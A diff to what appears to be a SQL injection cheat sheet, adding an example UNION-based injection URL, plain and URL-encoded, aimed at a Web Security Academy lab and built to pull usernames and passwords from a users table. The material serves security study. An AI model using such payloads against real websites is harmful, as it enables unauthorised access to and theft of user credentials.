@@ -122,6 +122,15 @@ Concatenation enables you combine multipe strings into a single string.
 |Postgre|`'foo'\|\|'bar'`|
 |MySQL|`'foot' 'bar'` or `CONCAT('foo','bar')`|
 
+Example Injection
+```sql
+# URL Encoded
+https://0ad100b803a6d0a281475c56006500d1.web-security-academy.net/filter?category=Accessories%27%20union%20select%20null,CONCAT(username,%27%26%27,password)%20from%20users--
+
+# Plain
+https://0ad100b803a6d0a281475c56006500d1.web-security-academy.net/filter?category=Accessories' union select null,CONCAT(username,'&',password) from users--
+```
+
 ### Getting the Database Layout to locate and extract the data.
 Finding all of the DB's
 ```sql
